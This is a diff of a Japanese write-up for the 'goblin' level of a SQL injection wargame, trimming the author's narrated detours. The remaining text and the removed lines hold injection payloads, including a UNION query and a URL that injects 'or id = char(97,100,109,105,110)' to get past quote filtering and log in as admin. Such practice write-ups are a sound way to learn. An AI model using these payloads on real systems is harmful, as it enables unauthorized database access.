@@ -28,9 +28,7 @@ query : select id from prob_goblin where id='guest' and no=
 
 ## memo
 
-これも問題を解く上ではきちんとコードだけ読めば一発でいけそうだが、私は紆余曲折するしここには紆余曲折も載せる。てゆうか解きながら書いてる。
-
-てことで考える前に```?no=aaa```とかで試してみる。
+```?no=aaa```とかで試してみる。
 
 ```query : select id from prob_goblin where id='guest' and no=aaa```となった。まあそうか。
 
@@ -45,14 +43,6 @@ query : select id from prob_goblin where id='guest' and no=
 
 とあるので、ログインが成功したあとでもDBから返ってきたidがadminになったときに問題が解ける。
 
-ここで、UNION とかで検索結果を和集合にしたらいいんじゃないかと予想する。
-
-```
-select id from prob_goblin where id='guest' and no=aaa union select id from prob_goblin where id='admin'
-```
-
-
-このまま実行しようとするのでNo Quotesが出そうなので書き換えを考える。
 'がフィルターされているときは"で置き換えるのがセオリーらしいが、"もフィルターされているのでどうしようかと悩む。
 
 そこで、adminという文字列のASCII値をchar()関数で戻しながらexploitに注入する方向で考えてみる。
@@ -60,19 +50,10 @@ select id from prob_goblin where id='guest' and no=aaa union select id from prob
 adminのASCII値を調べて条件に組み込む。
 
 ```
-https://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=aaa union select id from prob_goblin where id = char(97, 100, 109, 105, 110)
-```
-
-を試してみると`No Hack ~_~`とでた。
-`prob`とアンダースコアだ。笑 なぜ気が付かなかったんだろう。。。
-
-そもそもunion句にする必要ないなとここらへんで気が付きました。
-
-```
 select id from prob_goblin where id='guest' and no=aaa or id='admin'
 ```
 
-気を取り直してこのクエリを完成形で目指してエクスプロイトを考えたい。
+このクエリを完成形で目指してエクスプロイトを考えたい。
 
 ```
 https://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=2 or id = char(97,100,109,105,110)
